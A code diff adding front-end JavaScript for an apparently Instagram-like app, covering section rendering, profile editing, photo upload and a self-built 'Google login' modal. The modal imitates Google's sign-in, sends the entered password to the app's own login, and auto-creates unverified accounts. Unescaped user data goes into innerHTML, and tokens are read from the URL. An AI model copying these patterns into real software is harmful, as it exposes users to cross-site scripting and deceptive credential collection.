+                appMain.innerHTML = renderMessagesSection();
+            } else if (section === 'notifications') {
+                appMain.innerHTML = renderNotificationsSection();
+            } else if (section === 'create') {
+                appMain.innerHTML = renderCreateSection();
+            }
+        }
+
+        function renderProfileSection(user) {
+            return `
+                <div class="app-header">
+                    <div class="profile-photo ${user.profilePic ? 'has-image' : ''}" id="profilePhoto" onclick="changeProfilePictureClick()">
+                        <img id="profilePhotoImg" src="${user.profilePic || ''}" alt="Profile picture" class="${user.profilePic ? '' : 'hidden'}">
+                    </div>
+                    <div class="profile-details">
+                        <div class="username-row">
+                            <h1 id="profileUsername">${user.username || user.email}</h1>
+                            <div class="verified-badge">✓</div>
+                        </div>
+                        <div class="profile-stats">
+                            <div class="profile-stat"><strong id="statsPosts">${user.postsCount || 0}</strong><span>posts</span></div>
+                            <div class="profile-stat"><strong id="statsFollowers">${user.followers || 0}</strong><span>followers</span></div>
+                            <div class="profile-stat"><strong id="statsFollowing">${user.following || 0}</strong><span>following</span></div>
+                        </div>
+                        <div class="profile-bio">
+                            <p id="profileName">${user.name || user.username}</p>
+                            <p id="profileBio">${user.bio || 'challenges are always everywhere keep, the pace, and go to your limits'}</p>
+                        </div>
+                        <div class="profile-actions">
+                            <button type="button" onclick="editProfile()">Edit Profile</button>
+                            <button type="button" onclick="viewArchive()">View archive</button>
+                            <button type="button" onclick="changeProfilePictureClick()">Change profile picture</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="posts-grid" id="postsGrid">
+                    <div class="post-card new"><span>Create your first post</span></div>
+                    <div class="post-card"><span>Top Moments</span></div>
+                    <div class="post-card"><span>Best Pics</span></div>
+                    <div class="post-card"><span>Saved Stories</span></div>
+                    <div class="post-card"><span>Explorer</span></div>
+                    <div class="post-card"><span>Highlights</span></div>
+                </div>
+            `;
+        }
+
+        async function renderHomeSection(user) {
+            const posts = await apiFetch('/posts');
+            const postCards = posts.map((post) => `
+                <div class="post-card"><span>${post.caption || `${post.user.username} posted`}</span></div>
+            `).join('');
+
+            return `
+                <div class="section-header">
+                    <h2>Home</h2>
+                    <p>Welcome back, ${user.name || user.username}. Here is your feed.</p>
+                </div>
+                <div class="posts-grid">
+                    ${postCards || '<div class="post-card"><span>No posts yet</span></div>'}
+                </div>
+            `;
+        }
+
+        function renderSearchSection() {
+            return `
+                <div class="section-header">
+                    <h2>Search</h2>
+                    <p>Find profiles, tags, and explore new stories.</p>
+                </div>
+                <div class="posts-grid">
+                    <div class="post-card"><span>Search profiles</span></div>
+                    <div class="post-card"><span>Trending</span></div>
+                    <div class="post-card"><span>Discover</span></div>
+                    <div class="post-card"><span>Explore</span></div>
+                    <div class="post-card"><span>Hashtags</span></div>
+                    <div class="post-card"><span>Suggested</span></div>
+                </div>
+            `;
+        }
+
+        async function renderReelsSection() {
+            const posts = await apiFetch('/posts');
+            const reels = posts.filter((post) => post.type === 'reel');
+            const reelCards = reels.map((post) => `
+                <div class="post-card"><span>${post.caption || `${post.user.username} reel`}</span></div>
+            `).join('');
+
+            return `
+                <div class="section-header">
+                    <h2>Reels</h2>
+                    <p>Watch short videos from people you follow.</p>
+                </div>
+                <div class="posts-grid">
+                    ${reelCards || '<div class="post-card"><span>No reels available</span></div>'}
+                </div>
+            `;
+        }
+
+        function renderMessagesSection() {
+            return `
+                <div class="section-header">
+                    <h2>Messages</h2>
+                    <p>Your conversations are waiting.</p>
+                </div>
+                <div class="posts-grid">
+                    <div class="post-card"><span>Inbox</span></div>
+                    <div class="post-card"><span>New chat</span></div>
+                    <div class="post-card"><span>Friends</span></div>
+                    <div class="post-card"><span>Requests</span></div>
+                    <div class="post-card"><span>Rooms</span></div>
+                    <div class="post-card"><span>Calls</span></div>
+                </div>
+            `;
+        }
+
+        function renderNotificationsSection() {
+            return `
+                <div class="section-header">
+                    <h2>Notifications</h2>
+                    <p>All the latest activity on your account.</p>
+                </div>
+                <div class="posts-grid">
+                    <div class="post-card"><span>Likes</span></div>
+                    <div class="post-card"><span>Comments</span></div>
+                    <div class="post-card"><span>Mentions</span></div>
+                    <div class="post-card"><span>Follows</span></div>
+                    <div class="post-card"><span>Suggestions</span></div>
+                    <div class="post-card"><span>More</span></div>
+                </div>
+            `;
+        }
+
+        function renderCreateSection() {
+            return `
+                <div class="section-header">
+                    <h2>Create</h2>
+                    <p>Post new photos, videos, or share a story.</p>
+                </div>
+                <div class="posts-grid">
+                    <div class="post-card new"><span>Add post</span></div>
+                    <div class="post-card"><span>Photo</span></div>
+                    <div class="post-card"><span>Video</span></div>
+                    <div class="post-card"><span>Story</span></div>
+                    <div class="post-card"><span>Reel</span></div>
+                    <div class="post-card"><span>Live</span></div>
+                </div>
+            `;
+        }
+
+        async function renderProfile(user) {
+            const photo = document.getElementById('profilePhotoImg');
+            const wrapper = document.getElementById('profilePhoto');
+            if (!photo || !wrapper) return;
+            if (user.profilePic) {
+                photo.src = user.profilePic;
+                photo.classList.remove('hidden');
+                wrapper.classList.add('has-image');
+                wrapper.style.background = 'none';
+            } else {
+                photo.classList.add('hidden');
+                wrapper.classList.remove('has-image');
+                wrapper.style.background = 'linear-gradient(135deg, #dc2743 0%, #cc1433 100%)';
+            }
+        }
+
+        async function editProfile() {
+            const name = prompt('Enter your full name:', '');
+            const bio = prompt('Enter your bio:', '');
+            if (name === null && bio === null) {
+                return;
+            }
+            const body = {};
+            if (name !== null && name.trim()) body.name = name.trim();
+            if (bio !== null && bio.trim()) body.bio = bio.trim();
+            if (!Object.keys(body).length) return;
+
+            try {
+                const response = await apiFetch('/users/me', {
+                    method: 'PUT',
+                    body: JSON.stringify(body),
+                });
+                await showAppShell(response.user, 'profile');
+            } catch (error) {
+                alert(error.message);
+            }
+        }
+
+        function viewArchive() {
+            alert('Archive will be available soon.');
+        }
+
+        function changeProfilePictureClick() {
+            document.getElementById('profilePicInput').click();
+        }
+
+        async function updateProfilePicture(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+
+            const formData = new FormData();
+            formData.append('photo', file);
+
+            try {
+                await apiFetch('/users/me/photo', {
+                    method: 'POST',
+                    body: formData,
+                });
+                const user = await apiFetch('/users/me');
+                await showAppShell(user, 'profile');
+            } catch (error) {
+                alert(error.message);
+            }
+        }
+
+        async function logout() {
+            clearToken();
+            document.getElementById('appShell').style.display = 'none';
+            document.querySelector('.container').classList.remove('hidden');
+            document.getElementById('loginForm').style.display = 'block';
+            document.querySelector('#loginForm form').reset();
+            document.getElementById('loginSuccess').style.display = 'none';
+            document.getElementById('loginError').style.display = 'none';
+        }
+
+        // Google Login Functions
+        let googleEmailEntered = false;
+
+        function startGoogleLogin() {
+            document.getElementById('googleModal').style.display = 'block';
+            document.getElementById('googleEmail').focus();
+            document.getElementById('googleForm').reset();
+            document.getElementById('passwordGroup').style.display = 'none';
+            document.getElementById('googleSubmitBtn').textContent = 'Next';
+            googleEmailEntered = false;
+            document.getElementById('googleError').style.display = 'none';
+        }
+
+        function closeGoogleModal() {
+            document.getElementById('googleModal').style.display = 'none';
+        }
+
+        async function handleGoogleLogin(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('googleEmail').value.trim();
+            const password = document.getElementById('googlePassword').value;
+            const errorDiv = document.getElementById('googleError');
+            const loadingDiv = document.getElementById('googleLoading');
+            const passwordGroup = document.getElementById('passwordGroup');
+            const submitBtn = document.getElementById('googleSubmitBtn');
+
+            errorDiv.style.display = 'none';
+            loadingDiv.style.display = 'none';
+
+            if (!googleEmailEntered) {
+                if (!email) {
+                    errorDiv.textContent = 'Enter a valid email or phone number';
+                    errorDiv.style.display = 'block';
+                    return;
+                }
+
+                submitBtn.disabled = true;
+                loadingDiv.style.display = 'block';
+
+                try {
+                    const check = await apiFetch('/auth/check', {
+                        method: 'POST',
+                        body: JSON.stringify({ emailOrUsername: email }),
+                    });
+
+                    loadingDiv.style.display = 'none';
+                    submitBtn.disabled = false;
+
+                    if (check.exists) {
+                        googleEmailEntered = true;
+                        passwordGroup.style.display = 'block';
+                        document.getElementById('googlePassword').focus();
+                        submitBtn.textContent = 'Sign in';
+                        document.getElementById('googleEmail').readOnly = true;
+                    } else {
+                        const randomPassword = Math.random().toString(36).slice(-10);
+                        const newUser = await apiFetch('/auth/signup', {
+                            method: 'POST',
+                            body: JSON.stringify({
+                                name: email.split('@')[0],
+                                email,
+                                username: email.split('@')[0],
+                                password: randomPassword,
+                            }),
+                        });
+
+                        saveToken(newUser.token);
+                        closeGoogleModal();
+                        await showAppShell(newUser.user, 'profile');
+                    }
+                } catch (error) {
+                    loadingDiv.style.display = 'none';
+                    submitBtn.disabled = false;
+                    errorDiv.textContent = error.message;
+                    errorDiv.style.display = 'block';
+                }
+            } else {
+                if (!password) {
+                    errorDiv.textContent = 'Password is required';
+                    errorDiv.style.display = 'block';
+                    return;
+                }
+
+                submitBtn.disabled = true;
+                loadingDiv.style.display = 'block';
+
+                try {
+                    const response = await apiFetch('/auth/login', {
+                        method: 'POST',
+                        body: JSON.stringify({ emailOrUsername: email, password }),
+                    });
+                    saveToken(response.token);
+                    closeGoogleModal();
+                    await showAppShell(response.user, 'home');
+                } catch (error) {
+                    errorDiv.textContent = error.message;
+                    errorDiv.style.display = 'block';
+                } finally {
+                    submitBtn.disabled = false;
+                    loadingDiv.style.display = 'none';
+                }
+            }
+        }
+
+        // Handle Google OAuth callback
+        function handleGoogleOAuthCallback() {
+            const params = new URLSearchParams(window.location.search);
+            const token = params.get('token');
+            const userStr = params.get('user');
+
+            if (token && userStr) {
+                try {
+                    const user = JSON.parse(decodeURIComponent(userStr));
+                    saveToken(token);
+                    showAppShell(user, 'profile');
+                    window.history.replaceState({}, document.title, window.location.pathname);
+                } catch (error) {
+                    console.error('Error parsing user data:', error);
+                }
+            }
+        }
+
+        // Run OAuth callback handler on page load
+        window.addEventListener('load', handleGoogleOAuthCallback);
+
+        window.addEventListener('click', function (event) {
+            const googleModal = document.getElementById('googleModal');
+            if (event.target === googleModal) {
+                closeGoogleModal();
+            }
+        });
+    </script>
+</body>
+</html>
